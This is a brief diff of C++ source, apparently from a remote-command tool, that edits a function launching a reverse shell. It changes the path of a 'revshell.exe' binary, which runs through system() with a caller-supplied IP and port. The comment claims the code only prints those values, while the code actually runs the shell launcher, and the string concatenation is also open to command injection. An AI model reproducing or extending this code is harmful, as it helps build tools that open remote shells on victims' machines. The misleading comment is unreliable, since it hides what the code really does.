@@ -268,7 +268,7 @@ namespace CommandProcessor
         // Create a reverse shell connection to the specified IP and port
         // For demonstration purposes, we will just print the IP and port
         std::cout << "Starting reverse shell to " << ip << ":" << port << std::endl;
-        std::string command = "D:\\MyProject\\revshell\\x64\\Debug\\revshell.exe " + ip + " " + std::to_string(port);
+        std::string command = "revshell.exe " + ip + " " + std::to_string(port);
         int result = system(command.c_str());
         std::cout << "Reverse shell started" << std::endl;
         return true;
